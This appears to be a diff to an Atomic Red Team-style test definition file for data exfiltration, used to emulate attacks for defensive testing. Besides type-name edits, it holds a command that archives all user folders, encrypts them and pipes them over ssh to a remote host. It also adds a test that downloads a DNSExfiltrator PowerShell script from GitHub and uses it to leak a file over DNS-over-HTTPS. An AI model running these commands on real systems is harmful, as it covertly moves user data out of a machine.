@@ -15,7 +15,7 @@ atomic_tests:
   input_arguments:
     domain:
       description: target SSH domain
-      type: url
+      type: Url
       default: target.example.com
   executor:
     command: |
@@ -35,17 +35,63 @@ atomic_tests:
   input_arguments:
     user_name:
       description: username for domain
-      type: string
+      type: String
       default: atomic
     password:
       description: password for user
-      type: string
+      type: String
       default: atomic
     domain:
       description: target SSH domain
-      type: url
+      type: Url
       default: target.example.com
   executor:
     command: |
       tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'
     name: sh
+- name: DNSExfiltration (doh)
+  auto_generated_guid: c943d285-ada3-45ca-b3aa-7cd6500c6a48
+  description: |
+    DNSExfiltrator allows for transfering (exfiltrate) a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel.
+    !!! Test will fail without a domain under your control with A record and NS record !!! 
+    See this github page for more details - https://github.com/Arno0x/DNSExfiltrator
+  supported_platforms:
+  - windows
+  input_arguments:
+    password:
+      description: Password used to encrypt the data to be exfiltrated
+      type: String
+      default: atomic
+    domain:
+      description: The domain name to use for DNS requests
+      type: String
+      default: target.example.com
+    ps_module:
+      description: DNSExfiltrator powershell ps_module
+      type: Path
+      default: '$env:Temp\dnsexfil.ps1'
+    doh:
+      description: Google or CloudFlare DoH (DNS over HTTP) server
+      type: String
+      default: google
+    time:
+      description: The time in milliseconds to wait between each DNS request
+      type: String
+      default: 500
+    encoding:
+      description: Set to '-b32' to use base32 encoding of data. Might be required by some DNS resolvers.
+      type: String
+      default: null
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      DNSExfiltrator powershell file must exist on disk at specified location (#{ps_module})
+    prereq_command: |
+      if (Test-Path #{ps_module}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      IWR "https://raw.githubusercontent.com/Arno0x/DNSExfiltrator/8faa972408b0384416fffd5b4d42a7aa00526ca8/Invoke-DNSExfiltrator.ps1" -OutFile #{ps_module}
+  executor:
+    command: |
+      Import-Module #{ps_module}
+      Invoke-DNSExfiltrator -i #{ps_module} -d #{domain} -p #{password} -doh #{doh} -t #{time} #{encoding}
+    name: powershell
